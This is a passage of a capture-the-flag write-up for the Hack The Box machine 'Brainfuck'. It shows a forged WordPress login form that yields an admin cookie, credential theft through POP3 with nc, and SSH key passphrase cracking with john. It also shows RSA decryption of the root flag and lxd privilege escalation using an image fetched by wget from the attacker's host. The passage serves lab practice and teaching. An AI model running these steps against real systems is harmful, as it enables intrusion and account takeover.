+</span></span><span class="line"><span class="cl">	&lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;action&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;loginGuestFacebook&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">	&lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;Login&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span></code></pre></div><p>After redirecting, I got admin cookie.</p>
+<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.32.59.png" alt="Screenshot 2023-11-02 at 16.32.59.png"></p>
+<p>I found smtp credential in wp plugin setting.</p>
+<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.33.54.png" alt="Screenshot 2023-11-02 at 16.33.54.png"></p>
+<p>I accessed the pop3 port and logged in with the credential, and found some information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc 10.129.228.97 <span class="m">110</span>                                                         
+</span></span><span class="line"><span class="cl">+OK Dovecot ready.
+</span></span><span class="line"><span class="cl">USER orestis
+</span></span><span class="line"><span class="cl">+OK
+</span></span><span class="line"><span class="cl">PASS kHGuERB29DNiNE
+</span></span><span class="line"><span class="cl">+OK Logged in.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-ERR Unknown command: 
+</span></span><span class="line"><span class="cl">list
+</span></span><span class="line"><span class="cl">+OK <span class="m">2</span> messages:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> <span class="m">977</span>
+</span></span><span class="line"><span class="cl"><span class="m">2</span> <span class="m">514</span>
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">retr <span class="m">1</span>
+</span></span><span class="line"><span class="cl">+OK <span class="m">977</span> octets
+</span></span><span class="line"><span class="cl">Return-Path: &lt;www-data@brainfuck.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: orestis@brainfuck.htb
+</span></span><span class="line"><span class="cl">Delivered-To: orestis@brainfuck.htb
+</span></span><span class="line"><span class="cl">Received: by brainfuck <span class="o">(</span>Postfix, from userid 33<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	id 7150023B32<span class="p">;</span> Mon, <span class="m">17</span> Apr <span class="m">2017</span> 20:15:40 +0300 <span class="o">(</span>EEST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">To: orestis@brainfuck.htb
+</span></span><span class="line"><span class="cl">Subject: New WordPress Site
+</span></span><span class="line"><span class="cl">X-PHP-Originating-Script: 33:class-phpmailer.php
+</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">17</span> Apr <span class="m">2017</span> 17:15:40 +0000
+</span></span><span class="line"><span class="cl">From: WordPress &lt;wordpress@brainfuck.htb&gt;
+</span></span><span class="line"><span class="cl">Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+</span></span><span class="line"><span class="cl">X-Mailer: PHPMailer 5.2.22 <span class="o">(</span>https://github.com/PHPMailer/PHPMailer<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MIME-Version: 1.0
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your new WordPress site has been successfully <span class="nb">set</span> up at:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://brainfuck.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You can log in to the administrator account with the following information:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Username: admin
+</span></span><span class="line"><span class="cl">Password: The password you chose during the install.
+</span></span><span class="line"><span class="cl">Log in here: https://brainfuck.htb/wp-login.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We hope you enjoy your new site. Thanks!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--The WordPress Team
+</span></span><span class="line"><span class="cl">https://wordpress.org/
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">retr <span class="m">2</span>
+</span></span><span class="line"><span class="cl">+OK <span class="m">514</span> octets
+</span></span><span class="line"><span class="cl">Return-Path: &lt;root@brainfuck.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: orestis
+</span></span><span class="line"><span class="cl">Delivered-To: orestis@brainfuck.htb
+</span></span><span class="line"><span class="cl">Received: by brainfuck <span class="o">(</span>Postfix, from userid 0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	id 4227420AEB<span class="p">;</span> Sat, <span class="m">29</span> Apr <span class="m">2017</span> 13:12:06 +0300 <span class="o">(</span>EEST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">To: orestis@brainfuck.htb
+</span></span><span class="line"><span class="cl">Subject: Forum Access Details
+</span></span><span class="line"><span class="cl">Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">29</span> Apr <span class="m">2017</span> 13:12:06 +0300 <span class="o">(</span>EEST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">From: root@brainfuck.htb <span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hi there, your credentials <span class="k">for</span> our <span class="s2">&#34;secret&#34;</span> forum are below :<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">username: orestis
+</span></span><span class="line"><span class="cl">password: kIEnnfEKJ#9UmdO
+</span></span></code></pre></div><p>After logging as orestis, I found interesting forum page and figured that they are encrypted with Viginere cipher.</p>
+<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.36.19.png" alt="Screenshot 2023-11-02 at 16.36.19.png"></p>
+<p>Kasiski analysis: Key length is 11, possibly.</p>
+<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.19.25.png" alt="Screenshot 2023-11-02 at 16.19.25.png"></p>
+<p>Key might be “FUCKMYBRAIN”</p>
+<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.19.46.png" alt="Screenshot 2023-11-02 at 16.19.46.png"></p>
+<p>Gatcha.</p>
+<p><img src="Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.20.29.png" alt="Screenshot 2023-11-02 at 16.20.29.png"></p>
+<p>id_rsa has passphrase <em>sigh</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh orestis@10.129.228.97 -i ./id_rsa                                                                              <span class="m">255</span> ⨯
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;./id_rsa&#39;</span>: 
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;./id_rsa&#39;</span>: 
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;./id_rsa&#39;</span>: 
+</span></span><span class="line"><span class="cl">orestis@10.129.228.97: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
+</span></span></code></pre></div><p><a href="https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py"></a></p>
+<p>I made id_rsa into hash and got john to crack it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# python3 ssh2john.py ~/brain/id_rsa 
+</span></span><span class="line"><span class="cl">/root/brain/id_rsa:<span class="nv">$sshng$1$16$6904</span>FEF19397786F75BE2D7762AE7382<span class="nv">$1200$9</span>a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt id_rsa.hash 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">3</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
+</span></span><span class="line"><span class="cl">finding a possible candidate.
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">3poulakia!       <span class="o">(</span>/root/brain/id_rsa<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:03 DONE <span class="o">(</span>2023-11-02 16:42<span class="o">)</span> 0.3205g/s 4596Kp/s 4596Kc/s 4596KC/s     1990..*7¡Vamos!
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></div><h1 id="shell">Shell</h1>
+<p>By using the key obtained and password cracked with john, I got shell as orestis.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/brain<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh orestis@10.129.228.97 -i ./id_rsa                                                           
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;./id_rsa&#39;</span>: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.2 LTS <span class="o">(</span>GNU/Linux 4.4.0-75-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> packages can be updated.
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates are security updates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You have mail.
+</span></span><span class="line"><span class="cl">Last login: Mon Oct  <span class="m">3</span> 19:44:28 <span class="m">2022</span> from 10.10.14.23
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ ls
+</span></span><span class="line"><span class="cl">debug.txt  encrypt.sage  mail  output.txt  user.txt
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ cat user.txt
+</span></span><span class="line"><span class="cl">2c11cfbc5b959f73ac15a3310bd097c9
+</span></span></code></pre></div><p>I found interesting files in the home folder.</p>
+<p>Seems like <code>encrypt.sage</code> outputs root flag based on the randomly generated keys.</p>
+<p>Lucky thing, p and q values are stored in debug.txt and we can reverse engineer this somehow.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">orestis@brainfuck:~$ cat output.txt 
+</span></span><span class="line"><span class="cl">Encrypted Password: <span class="m">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span>
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ cat debug.txt 
+</span></span><span class="line"><span class="cl"><span class="m">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
+</span></span><span class="line"><span class="cl"><span class="m">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
+</span></span><span class="line"><span class="cl"><span class="m">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ cat encrypt.sage 
+</span></span><span class="line"><span class="cl"><span class="nv">nbits</span> <span class="o">=</span> <span class="m">1024</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">password</span> <span class="o">=</span> open<span class="o">(</span><span class="s2">&#34;/root/root.txt&#34;</span><span class="o">)</span>.read<span class="o">()</span>.strip<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">enc_pass</span> <span class="o">=</span> open<span class="o">(</span><span class="s2">&#34;output.txt&#34;</span>,<span class="s2">&#34;w&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">debug</span> <span class="o">=</span> open<span class="o">(</span><span class="s2">&#34;debug.txt&#34;</span>,<span class="s2">&#34;w&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">m</span> <span class="o">=</span> Integer<span class="o">(</span>int<span class="o">(</span>password.encode<span class="o">(</span><span class="s1">&#39;hex&#39;</span><span class="o">)</span>,16<span class="o">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">p</span> <span class="o">=</span> random_prime<span class="o">(</span>2^floor<span class="o">(</span>nbits/2<span class="o">)</span>-1, <span class="nv">lbound</span><span class="o">=</span>2^floor<span class="o">(</span>nbits/2-1<span class="o">)</span>, <span class="nv">proof</span><span class="o">=</span>False<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">q</span> <span class="o">=</span> random_prime<span class="o">(</span>2^floor<span class="o">(</span>nbits/2<span class="o">)</span>-1, <span class="nv">lbound</span><span class="o">=</span>2^floor<span class="o">(</span>nbits/2-1<span class="o">)</span>, <span class="nv">proof</span><span class="o">=</span>False<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">n</span> <span class="o">=</span> p*q
+</span></span><span class="line"><span class="cl"><span class="nv">phi</span> <span class="o">=</span> <span class="o">(</span>p-1<span class="o">)</span>*<span class="o">(</span>q-1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">e</span> <span class="o">=</span> ZZ.random_element<span class="o">(</span>phi<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> gcd<span class="o">(</span>e, phi<span class="o">)</span> !<span class="o">=</span> 1:
+</span></span><span class="line"><span class="cl">    <span class="nv">e</span> <span class="o">=</span> ZZ.random_element<span class="o">(</span>phi<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">c</span> <span class="o">=</span> pow<span class="o">(</span>m, e, n<span class="o">)</span>
+</span></span><span class="line"><span class="cl">enc_pass.write<span class="o">(</span><span class="s1">&#39;Encrypted Password: &#39;</span>+str<span class="o">(</span>c<span class="o">)</span>+<span class="s1">&#39;\n&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">debug.write<span class="o">(</span>str<span class="o">(</span>p<span class="o">)</span>+<span class="s1">&#39;\n&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">debug.write<span class="o">(</span>str<span class="o">(</span>q<span class="o">)</span>+<span class="s1">&#39;\n&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">debug.write<span class="o">(</span>str<span class="o">(</span>e<span class="o">)</span>+<span class="s1">&#39;\n&#39;</span><span class="o">)</span>
+</span></span></code></pre></div><p>It turned out that this is RSA and the script in the link below can crack the case.</p>
+<p><a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">RSA given q, p and e?</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">def egcd<span class="o">(</span>a, b<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    x,y, u,v <span class="o">=</span> 0,1, 1,0
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> a !<span class="o">=</span> 0:
+</span></span><span class="line"><span class="cl">        q, <span class="nv">r</span> <span class="o">=</span> b//a, b%a
+</span></span><span class="line"><span class="cl">        m, <span class="nv">n</span> <span class="o">=</span> x-u*q, y-v*q
+</span></span><span class="line"><span class="cl">        b,a, x,y, u,v <span class="o">=</span> a,r, u,v, m,n
+</span></span><span class="line"><span class="cl">        <span class="nv">gcd</span> <span class="o">=</span> b
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> gcd, x, y
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def main<span class="o">()</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">p</span> <span class="o">=</span> <span class="m">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">q</span> <span class="o">=</span> <span class="m">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">e</span> <span class="o">=</span> <span class="m">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">ct</span> <span class="o">=</span> <span class="m">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># compute n</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">n</span> <span class="o">=</span> p * q
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Compute phi(n)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">phi</span> <span class="o">=</span> <span class="o">(</span>p - 1<span class="o">)</span> * <span class="o">(</span>q - 1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Compute modular inverse of e</span>
+</span></span><span class="line"><span class="cl">    gcd, a, <span class="nv">b</span> <span class="o">=</span> egcd<span class="o">(</span>e, phi<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">d</span> <span class="o">=</span> a
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    print<span class="o">(</span> <span class="s2">&#34;n:  &#34;</span> + str<span class="o">(</span>d<span class="o">)</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Decrypt ciphertext</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">pt</span> <span class="o">=</span> pow<span class="o">(</span>ct, d, n<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    print<span class="o">(</span> <span class="s2">&#34;pt: &#34;</span> + str<span class="o">(</span>pt<span class="o">)</span> <span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Decode the pt from hex to string</span>
+</span></span><span class="line"><span class="cl">    print<span class="o">(</span>bytes.fromhex<span class="o">(</span>f<span class="s2">&#34;{pt:x}&#34;</span><span class="o">)</span>.decode<span class="o">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nv">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span>:
+</span></span><span class="line"><span class="cl">    main<span class="o">()</span>
+</span></span></code></pre></div><p>I got the code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">~/tmp  python3 decrypt.py
+</span></span><span class="line"><span class="cl">n:  <span class="m">8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977</span>
+</span></span><span class="line"><span class="cl">pt: <span class="m">24604052029401386049980296953784287079059245867880966944246662849341507003750</span>
+</span></span><span class="line"><span class="cl">6efc1a5dbb8904751ce6566a305bb8ef
+</span></span></code></pre></div><h1 id="alternative-pwn-root">Alternative pwn root</h1>
+<p>orestis belongs to the user lxd, this can be used to escalated privilege.</p>
+<p>Follow the procedure below:</p>
+<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">lxd/lxc Group - Privilege escalation</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">orestis@brainfuck:/tmp$ wget http://10.10.16.17/alpine-v3.8-i686-20231103_2308.tar.gz
+</span></span><span class="line"><span class="cl">--2023-11-03 23:09:57--  http://10.10.16.17/alpine-v3.8-i686-20231103_2308.tar.gz
+</span></span><span class="line"><span class="cl">Connecting to 10.10.16.17:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Length: <span class="m">2688693</span> <span class="o">(</span>2.6M<span class="o">)</span> <span class="o">[</span>application/gzip<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Saving to: ‘alpine-v3.8-i686-20231103_2308.tar.gz’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">alpine-v3.8-i686-20231103_2308. 100%<span class="o">[====================================================</span>&gt;<span class="o">]</span>   2.56M  2.29MB/s    in 1.1s    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-11-03 23:09:59 <span class="o">(</span>2.29 MB/s<span class="o">)</span> - ‘alpine-v3.8-i686-20231103_2308.tar.gz’ saved <span class="o">[</span>2688693/2688693<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">orestis@brainfuck:/tmp$ ls
+</span></span><span class="line"><span class="cl">44298.cpp                                 systemd-private-0e67eb0140b54d09bf939accd67f244b-dovecot.service-N01XPR
+</span></span><span class="line"><span class="cl">alpine-v3.13-x86_64-20210218_0139.tar.gz  systemd-private-0e67eb0140b54d09bf939accd67f244b-systemd-timesyncd.service-JEj2dH
+</span></span><span class="line"><span class="cl">alpine-v3.8-i686-20231103_2308.tar.gz     tmux-1000
+</span></span><span class="line"><span class="cl">linpeas.sh                                vmware-root
+</span></span><span class="line"><span class="cl">orestis@brainfuck:/tmp$ cp alpine* ~/
+</span></span><span class="line"><span class="cl">orestis@brainfuck:/tmp$ <span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ lxc image import ./alpine*.tar.gz --alias myimage
+</span></span><span class="line"><span class="cl">Image imported with fingerprint: ab6df67ab0d550d357dedcce7c253b35f68eb9fb80fd207fad16800fbb1fd028
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ lxd init
+</span></span><span class="line"><span class="cl">error: This must be run as root
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ sudo lxd init
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> orestis: 
+</span></span><span class="line"><span class="cl">Sorry, try again.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> orestis: 
+</span></span><span class="line"><span class="cl">Sorry, try again.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> orestis: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo: <span class="m">3</span> incorrect password attempts
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ 
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ lxc init myimage mycontainer -c security.privileged<span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">Creating mycontainer
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ lxc config device add mycontainer mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">Device mydevice added to mycontainer
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ lxc start mycontainer
+</span></span><span class="line"><span class="cl">orestis@brainfuck:~$ lxc <span class="nb">exec</span> mycontainer /bin/sh
+</span></span><span class="line"><span class="cl">~ <span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">~ <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">~ <span class="c1"># pwd</span>
+</span></span><span class="line"><span class="cl">/root
+</span></span><span class="line"><span class="cl">~ <span class="c1"># cd ..</span>
+</span></span><span class="line"><span class="cl">/ <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">bin            home           metadata.yaml  proc           run            sys            usr
+</span></span><span class="line"><span class="cl">dev            lib            mnt            root           sbin           templates      var
+</span></span><span class="line"><span class="cl">etc            media          opt            rootfs         srv            tmp
